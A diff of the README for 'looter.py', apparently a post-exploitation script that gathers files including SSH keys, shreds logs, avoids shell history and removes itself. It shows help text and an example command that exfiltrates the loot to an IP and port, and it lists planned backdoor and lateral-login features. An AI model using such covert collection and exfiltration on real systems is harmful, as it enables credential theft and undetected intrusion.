@@ -11,7 +11,7 @@ The goal is to be discreet and the script will shred logs, avoid writing to bash
 
 This Python script has been tested on Kali Linux 64 bit with Python 2.7.12.
 
-#Help Screen 
+##Help Screen 
 ```
 usage: looter.py [-h] [-a] [-ne] [-d PATH] [-t TARGET] [-p PORT] [-r]
 
@@ -27,7 +27,7 @@ optional arguments:
   -p PORT, --port PORT  specify exfil port number
   -r, --remove          remove script after execution
 ```
-#Usage Examples
+##Usage Examples
 
 A collection without any exfiltration can be done with the command below:
 
@@ -52,10 +52,11 @@ Specifying the -d flag with a valid path will change the default nest egg locati
 python ./looter.py -a -t 10.0.0.1 -p 1234 -d ~/Desktop/
 ```
 
-#Known Issues
+##Known Issues
 * Clean up collection of ~/.ssh/ file (currently throws everything into single folder with everything else)
+* Not sure how "discreet" the script is yet, plenty of room for improvement
 
-#Future Work
+##Future Work
 * Search ssh known_hosts file and attempt to log into entries
 * Dump any databases into a file
 * Run a quick internal network scan and output into a file
@@ -65,8 +66,7 @@ python ./looter.py -a -t 10.0.0.1 -p 1234 -d ~/Desktop/
 * Attempt to install a basic backdoor
 * Provide OS compatibility across OSX, Windows, and *nix
 
-
-#Resources
+##Resources
 https://pymotw.com/2/argparse/
 
 http://stackoverflow.com/questions/3718657/how-to-properly-determine-current-script-directory-in-python
